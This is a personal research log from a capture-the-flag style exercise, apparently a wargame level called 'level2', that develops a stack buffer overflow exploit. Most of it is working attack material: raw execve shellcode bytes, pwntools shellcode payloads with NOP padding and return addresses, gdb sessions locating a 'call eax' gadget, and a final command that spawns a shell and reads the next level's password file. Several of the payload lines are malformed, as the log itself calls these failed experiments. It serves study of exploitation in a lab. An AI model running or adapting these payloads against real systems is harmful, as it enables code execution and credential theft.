# Research notes

This is the working log, including experiments that did not succeed. The verified VM procedure is in `../walkthrough`. Addresses from local experiments may differ from the ISO VM.

```bash
start < <(python -c "import struct; print 'c' * 80 + struct.pack('<I', 0x08048444)")
start < <(python -c "import struct; print struct.pack('<I', 0xcccccccc) + 'c'*76 + struct.pack('<I', 0x804853e) + struct.pack('<I', 0xbffff75c)")


start < <(python -c "import struct; print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80' + 'A'*55 + struct.pack('<I', 0x804853e) + struct.pack('<I', 0xbffff75c)")
start < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A"*55 + "\x08\xa0\x04\x08"')

start < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A"*55 + "\x08\xa0\x04\x08"')
```

```
python -c 'import os, struct; os.write(1, b'c' * 76 + struct.pack('<I', 0x8048444))'
sys.stdout.write((b'c' * 76 struct.pack('<I', 0x8048444) ).decode('latin1'))
import sys; sys.stdout.write((b'c' * 76 + struct.pack('<I', 0x8048444) ).decode('latin1'))

start < <(PWNLIB_LOG_LEVEL=error python -c 'from pwn import asm, context, p32, shellcraft; import os; context.clear(arch="i386", os="linux"); os.write(1,asm(shellcraft.i386.linux.sh()).ljust(80, b"\x90") + p32(0x0804a008))')
```


```bash
#set exec-wrapper env 'LD_PRELOAD=./myso.so'
#set environment LD_PRELOAD ./myso.so

#set environment LD_LIBRARY_PATH /usr/lib/llvm-14/lib/clang/14.0.0/lib/linux




(gdb) i files
Symbols from "/home/user/level2/level2".
Local exec file:
`/home/user/level2/level2`, file type elf32-i386.
	Entry point: 0x8048420
	0x08048134 - 0x08048147 is .interp
	0x08048148 - 0x08048168 is .note.ABI-tag
	0x08048168 - 0x0804818c is .note.gnu.build-id
	0x0804818c - 0x080481b0 is .gnu.hash
	0x080481b0 - 0x08048260 is .dynsym
	0x08048260 - 0x080482d1 is .dynstr
	0x080482d2 - 0x080482e8 is .gnu.version
	0x080482e8 - 0x08048308 is .gnu.version_r
	0x08048308 - 0x08048318 is .rel.dyn
	0x08048318 - 0x08048358 is .rel.plt
	0x08048358 - 0x08048386 is .init
	0x08048390 - 0x08048420 is .plt
 => 0x08048420 - 0x080485fc is .text
	0x080485fc - 0x08048616 is .fini
	0x08048618 - 0x08048626 is .rodata
	0x08048628 - 0x08048664 is .eh_frame_hdr
	0x08048664 - 0x08048748 is .eh_frame
	0x08049748 - 0x08049750 is .ctors
	0x08049750 - 0x08049758 is .dtors
	0x08049758 - 0x0804975c is .jcr
	0x0804975c - 0x08049824 is .dynamic
	0x08049824 - 0x08049828 is .got
	0x08049828 - 0x08049854 is .got.plt
	0x08049854 - 0x0804985c is .data
	0x08049860 - 0x0804986c is .bss

(gdb) find /b 0x08048420, 0x080485fc, (char) 0xff, (char) 0xd0
0x80484cf <frame_dummy+31>
0x80485eb <__do_global_ctors_aux+27>
2 patterns found.
(gdb) x/2i 0x80484cf
   0x80484cf <frame_dummy+31>:	call   eax
   0x80484d1 <frame_dummy+33>:	leave

br *0x080484ed # br *p+25
br *0x0804853d # br *p+105

set environment PWNLIB_LOG_LEVEL error
start < <(PWNLIB_LOG_LEVEL=error \
  python2.7 -c 'import os; from pwn import asm, p32, shellcraft; \
  os.write(1, asm(shellcraft.i386.linux.sh()).ljust(76, b"\x90") \
    + p32(0xffffc700) \
    + p32(0x080484cf))')

set args < <(PWNLIB_LOG_LEVEL=error \
python2.7 -c 'import os; from pwn import asm, p32, shellcraft; \
  os.write(1, asm(shellcraft.i386.linux.sh()).ljust(76, b"\x90") \
    + p32(0xffffc700) \
    + p32(0x080484cf))')

(gdb) p $ebp-0x4c
$4 = (void *) 0xbffff6fc
(gdb) p 0xbffff74c - 0xbffff6fc
$5 = 80

info frame
x/a 0xbffff728
x/a 0xbffff72c


PWNLIB_LOG_LEVEL=error python2.7 -c '
from pwn import asm, context, p32, shellcraft
context.clear(arch="i386", os="linux")
print asm(shellcraft.i386.linux.sh()).ljust(80, "\x90") + p32(0x0804a008)
' | xxd -g 1

PWNLIB_NOTERM=1 python2.7 -c \
    'from pwn import asm, p32, shellcraft; \
    print asm(shellcraft.i386.linux.sh()).ljust(80, b"\x90") + \
    p32(0x0804a008)' | xxd -g1



```

```bash

(gdb) i files
Symbols from "/home/user/level2/level2".
Local exec file:
`/home/user/level2/level2', file type elf32-i386.
	Entry point: 0x8048420
	0x08048134 - 0x08048147 is .interp
	0x08048148 - 0x08048168 is .note.ABI-tag
	0x08048168 - 0x0804818c is .note.gnu.build-id
	0x0804818c - 0x080481b0 is .gnu.hash
	0x080481b0 - 0x08048260 is .dynsym
	0x08048260 - 0x080482d1 is .dynstr
	0x080482d2 - 0x080482e8 is .gnu.version
	0x080482e8 - 0x08048308 is .gnu.version_r
	0x08048308 - 0x08048318 is .rel.dyn
	0x08048318 - 0x08048358 is .rel.plt
	0x08048358 - 0x08048386 is .init
	0x08048390 - 0x08048420 is .plt
 => 0x08048420 - 0x080485fc is .text
	0x080485fc - 0x08048616 is .fini
	0x08048618 - 0x08048626 is .rodata
	0x08048628 - 0x08048664 is .eh_frame_hdr
	0x08048664 - 0x08048748 is .eh_frame
	0x08049748 - 0x08049750 is .ctors
	0x08049750 - 0x08049758 is .dtors
	0x08049758 - 0x0804975c is .jcr
	0x0804975c - 0x08049824 is .dynamic
	0x08049824 - 0x08049828 is .got
	0x08049828 - 0x08049854 is .got.plt
	0x08049854 - 0x0804985c is .data
	0x08049860 - 0x0804986c is .bss

(gdb) find /b 0x08048420, 0x080485fc, (char) 0xff, (char) 0xd0
0x80484cf <frame_dummy+31>
0x80485eb <__do_global_ctors_aux+27>
2 patterns found.
(gdb) x/2i 0x80484cf
   0x80484cf <frame_dummy+31>:	call   eax
   0x80484d1 <frame_dummy+33>:	leave


br *0x080484ed # br *p+25
br *0x0804853d # br *p+105

start < <(python -c 'import os; from pwn import asm, p32, shellcraft; \
   os.write(1, asm(shellcraft.i386.linux.sh()).ljust(76, b"\x90") \
   + p32(0xbffff738) \
   + p32(0x80484cf) \
   + b"\n")')




```

```bash

br *p+25

br *p+105

set environment PWNLIB_LOG_LEVEL error

start < <(python -c 'import os; from pwn import asm, p32, shellcraft; \
   os.write(1, asm(shellcraft.i386.linux.sh()).ljust(76, b"\x90") \
   + p32(0xbffff738) \
   + p32(0x080484cf) \
   + b"\n")')

start < <(python2.7 -c 'import os; from pwn import asm, p32, shellcraft; \
   os.write(1, asm(shellcraft.i386.linux.sh()).ljust(76, b"\x90") \
   + p32(0xbffff738) \
   + p32(0x080484cf) \
   + b"\n")')

run < <(python2.7 -c 'import os; from pwn import asm, p32, shellcraft; \
   os.write(1, asm(shellcraft.i386.linux.sh()).ljust(76, b"\x90") \
   + p32(0xbffff738) \
   + p32(0x080484cf) \
   + b"\n")')


set environment PWNLIB_LOG_LEVEL error

set args < <(python2.7 -c 'import os; from pwn import asm, p32, shellcraft; \
   os.write(1, asm(shellcraft.i386.linux.sh()).ljust(76, b"\x90") \
   + p32(0xbffff5d8) \
   + p32(0x080484cf) \
   + b"\n")')

# https://www.sourceware.org/gdb/download/onlinedocs/gdb.html/Non_002dStop-Mode.html#Non_002dStop-Mode
# https://www.sourceware.org/gdb/download/onlinedocs/gdb.html/Maintenance-Commands.html

set displaced-stepping off # solves the multithreaded environment stepping
set debug displaced on
set debug infrun 1

# -R  ADDR_NO_RANDOMIZE
# -X  READ_IMPLIES_EXEC
set exec-wrapper setarch i386 -R -X


set args < <(python2.7 -c 'import os; from pwn import asm, context, p32, shellcraft; \
   context.clear(arch="i386", os="linux"); \
   os.write(1, asm(shellcraft.i386.linux.sh()).ljust(76, b"\x90") \
   + p32(0xffffc708) \
   + p32(0x080484cf) \
   + b"\n")')

set breakpoint pending on
br *0x804b5c0

show args


br p
start

python print(gdb.parse_and_eval('$ebp') - gdb.parse_and_eval('$esp'))
python print(gdb.parse_and_eval('$ebp - $esp'))
python print("\n".join(
  gdb.execute("info proc mappings", to_string=True, styling=True)\
    .strip()\
    .split("\n")[::-1]))


python gdb.selected_inferior().write_memory(\
  int(gdb.parse_and_eval('$esp')),\
  b'\x00' * int(gdb.parse_and_eval('$ebp - $esp')))

stack -i 32
```

```bash
shopt -s cmdhist
shopt -s lithist
HISTTIMEFORMAT='%F %T '
```

### Inside PEDA

```bash
source ~/peda/peda.py

pset option clearscr off

pset option pagesize 0

pset option context ""

context code 30


# Show all PEDA options
pshow option

# Change them
pset option ansicolor off
pset option clearscr off
pset option pagesize 0
pset option pattern 2
pset option indent 8
pset option verbose on
pset option debug on

# Show context config
pshow option context

pset option context register,code,stack
pset option context code,stack
pset option context all



```




## Next to explore:
- register-based control-flow transfer
- ROP-chains
- jmp-call-pop

## Final:

```bash
(PWNLIB_LOG_LEVEL=error \
  python -c 'import os; from pwn import asm, p32, shellcraft; \
  os.write(1, asm(shellcraft.i386.linux.sh()).ljust(76, b"\x90") \
    + p32(0xbffff738) \
    + p32(0x080484cf) + b"\n")'; cat ) | ./level2

(PWNLIB_LOG_LEVEL=error \
  python -c 'import os; from pwn import asm, p32, shellcraft; \
  os.write(1, asm(shellcraft.i386.linux.sh()).ljust(80, b"\x90") \
    + p32(0x080484cf) + b"\n")'; echo -e "id\ncat /home/user/level3/.pass" ) | ./level2

```


```text

https://lkml.iu.edu/hypermail/linux/kernel/2004.2/06197.html

man 2 mprotect

Whether PROT_EXEC has any effect different from PROT_READ depends
   on processor architecture, kernel version, and process state.  If
   READ_IMPLIES_EXEC is set in the process's personality flags (see
   personality(2)), specifying PROT_READ will implicitly add
   PROT_EXEC.

man 2 personality

$ readelf -W -l ./level2 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4

pwndbg> x/20i 0x804b5c0
   0x804b5c0:	push   0x68
=> 0x804b5c2:	push   0x732f2f2f
   0x804b5c7:	push   0x6e69622f
   0x804b5cc:	mov    ebx,esp
   0x804b5ce:	push   0x1010101
   0x804b5d3:	xor    DWORD PTR [esp],0x1016972
   0x804b5da:	xor    ecx,ecx
   0x804b5dc:	push   ecx
   0x804b5dd:	push   0x4
   0x804b5df:	pop    ecx
   0x804b5e0:	add    ecx,esp
   0x804b5e2:	push   ecx
   0x804b5e3:	mov    ecx,esp
   0x804b5e5:	xor    edx,edx
   0x804b5e7:	push   0xb
   0x804b5e9:	pop    eax
   0x804b5ea:	int    0x80
   0x804b5ec:	nop
   0x804b5ed:	nop
   0x804b5ee:	nop
pwndbg> si

Program received signal SIGSEGV, Segmentation fault.

pwndbg> vmmap 0x0804b5c0
       Start        End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
   0x8049000  0x804a000 rw-p     1000       0 level2
►  0x804a000  0x806c000 rw-p    22000       0 [heap] +0x15c0
  0xf7d67000 0xf7d87000 r--p    20000       0 /usr/lib/i386-linux-gnu/libc.so.6

pwndbg> pipe i proc mappings | grep heap
	 0x804a000  0x806c000    0x22000        0x0  rw-p   [heap]


# on the old machine

gdb-peda$ vmmap 0x804a008
Start      End        Perm	Name
0x0804a000 0x0806b000 rwxp	[heap]


```

```bash
printf 'ABCDEFGH' | hexdump -v -e '"0x" 4/1 "%02x" " "' -e '"\n"'
printf 'ABCDEFGH' | hexdump -v -e '1/4 "0x%08x\n"'
printf 'ABCDEFGH' | od -An -tx4 --endian=little'
```


### Links:
- https://epi052.gitlab.io/notes-to-self/blog/2018-07-15-jmp-call-pop/
- https://seedsecuritylabs.org/Labs_20.04/Files/Shellcode/Shellcode.pdf
- https://web.archive.org/web/20220502004503/https://people.cs.rutgers.edu/~pxk/419/notes/hijacking.html
- https://www.c-plusplus.net/forum/topic/320525/segmentation-fault-beim-modifizieren-eines-strings-unter-assembler
- https://github.com/agavrel/42_CheatSheet#shellcode-execution-to-get-root-access
- https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2.html
- https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html
- https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3.html
- https://www.tenouk.com/Bufferoverflowc/Bufferoverflow4.html
- https://www.tenouk.com/Bufferoverflowc/Bufferoverflow5.html
